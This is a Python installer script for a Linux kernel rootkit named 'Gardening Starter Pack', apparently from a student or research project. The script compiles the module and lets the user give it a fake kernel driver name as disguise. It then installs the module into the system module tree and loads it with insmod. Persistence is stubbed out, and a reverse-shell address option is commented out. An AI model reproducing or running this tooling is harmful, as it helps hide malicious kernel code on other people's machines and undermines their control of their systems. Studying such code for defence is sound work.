#! /usr/bin/python3
# This script is used for the installation and removal of the rootkit

import os
import sys
import shlex
from shutil import move
from subprocess import STDOUT, CalledProcessError, check_output

#######
# Prompting/Printing Helpers
######

colors = {
	"RED": "\033[31m",
	"GREEN": "\033[32m",
	"YELLOW": "\033[33m",
	"BLUE": "\033[34m",
}

style = {
	"BOLD": "\033[1m",
	"RESET": "\033[0m",
}


def print_success(text):
	print(colors["GREEN"], style["BOLD"], text, style["RESET"])


def print_error(text):
	print(colors["RED"], style["BOLD"], "ERROR:", text, style["RESET"])


def print_status(text):
	print(colors["BLUE"], style["BOLD"], text, style["RESET"])


def print_question(text):
	print(colors["YELLOW"], style["BOLD"], text, style["RESET"])


def print_help():
	print("Gardening Starter Pack (Rootkit) Usage")
	print("Written by Aaron Lichtman, Arch Gupta and Brandon Weidner.")
	print("\t--install\t\tinstall the rootkit.")
	print("\t--uninstall\t\tuninstall the rootkit.")
	print("\t-h \\ --help\t\tyou seem to have figured this one out already.")


def prompt_yes_no(question):
	"""
	Prints question and waits for Y/N. Loops on invalid response.
	Returns True if Yes, False if No..
	"""
	print_question(question + " [Y / N]")
	valid_response = False
	while not valid_response:
		response = input().strip().lower()
		if response == "y":
			return True
		elif response == "n":
			return False
		else:
			print_error("Invalid response. Enter either Y or N. No other letters are valid.")


def prompt(text, default):
	"""
	Prompt with the option to leave the default.
	"""
	print_question(text + " [Default: {}]".format(default))
	response = input().strip()
	if response == "":
		return default
	else:
		return response


####
# Build Process Helpers
####

def run_cmd(command, working_dir=None, run_with_os=False):
	"""
	Command can be either a list or a string. Exits if running command
	returns an error.
	"""
	# TODO: Pipe all output to sp.DEVNULL when done fine-tuning build script.
	if not isinstance(command, list):
		command = shlex.split(command)

	print_status("Executing: {}".format(command))
	# For some reason, check_output can't successfully run the `insmod` command.
	if run_with_os:
		os.system(command)
	else:
		try:
			check_output(command, shell=True, stderr=STDOUT, cwd=working_dir)
		except CalledProcessError as exc:
			print_error("Error running command. Exiting.")
			print(exc.output)
			sys.exit(1)


def create_config_header_file(user_defines: dict, path: str):
	"""
	Creates config.h file and populates it with user defined constants.
	:param: user_defines: dict
	"""
	contents = "#ifndef _CONFIG_H\n#define _CONFIG_H\n"
	for key, val in user_defines.items():
		contents += "#define {} {}\n".format(key, val)
	contents += "#endif"

	with open(path, "w") as f:
		f.write(contents)

####
# Persistence
####


def enable_persistence():
	pass
	print_status("Making rootkit persistent...")
	# TODO: This
	print_success("Persistence established.")


def remove_persistence():
	# TODO: This
	pass


####
# Main Setup Methods
# 	- Install
# 	- Uninstall
####

def validate_os_and_kernel():
	"""
	Checks if the rootkit is compatible with the OS and kernel.
	Exits if it's incompatible. Returns kernel version as string if
	everything is okay.
	"""
	os_info = os.uname()
	if os_info[0].lower() != "linux":
		print_error("Not on linux. Exiting.")
		sys.exit(1)

	kernel_version = os_info[2]
	valid_kernels = ["4.18.0-16-generic", "4.18.0-15-generic"]
	if kernel_version not in valid_kernels:
		print_error("Invalid kernel. Exiting.")
		sys.exit(1)

	return kernel_version


def install(kernel_version):
	print_status("Starting rootkit installation...")

	config = {}
	config["MODULE_NAME"] = "garden.ko"
	config["DRIVER_NAME"] = prompt("Enter the name of a kernel driver to disguise your rootkit.", "garden")
	# config["HIDDEN_FILE_PREFIX"] = prompt("Enter prefix for files to hide.", "Garden")
	# config["REVERSE_SHELL_IP_ADDR"] = prompt("Enter IP address for reverse shell.")

	config_path = "./rootkit/config.h"
	print_status("Creating config file...")
	create_config_header_file(config, config_path)
	print_success("{} created.".format(config_path))

	# Compile rootkit
	print_status("Compiling rootkit...")
	run_cmd("make all", "./rootkit")
	print_success("Successful compilation.")

	# Move compiled components to the right place. Maybe drop it in "/lib/modules/{0}/garden?
	print_status("Installing rootkit...")
	module_dest_dir = "/lib/modules/{0}/kernel/drivers/{1}".format(kernel_version, config["DRIVER_NAME"])
	if not os.path.exists(module_dest_dir):
		os.mkdir(module_dest_dir)

	module_curr_path = "./rootkit/{}".format(config["MODULE_NAME"])
	module_dest_path = module_dest_dir + "/" + config["MODULE_NAME"]

	# Move the compiled kernel module to the kernel modules directories.
	try:
		print_status("Moving {} to {}".format(module_curr_path, module_dest_path))
		move(module_curr_path, module_dest_path)
	except IOError as e:
		print_error("Unable to copy file. {}".format(e))
		sys.exit()

	# Load the kernel module
	run_cmd("depmod")
	run_cmd("insmod {}".format(module_dest_path), run_with_os=True)

	# Option to enable persistence by making the module load on boot.
	if prompt_yes_no("Enable persistence?"):
		enable_persistence()

	print_success("Successful installation.")


def uninstall():
	# TODO: This will likely have to be more complete when we add more,
	# but for now a simple `$ rmmod garden` works.
	module = prompt("Enter the name of the module to remove.", "garden")
	run_cmd("sudo rmmod {}".format(module))
	print_success("Removed {} from modules.".format(module))


def main():
	kernel_version = validate_os_and_kernel()

	if sys.argv[1] not in ["install", "uninstall"]:
		print_help()
	elif "install" == sys.argv[1]:
		install(kernel_version)
	elif "uninstall" == sys.argv[1]:
		uninstall()


if __name__ == "__main__":
    main()
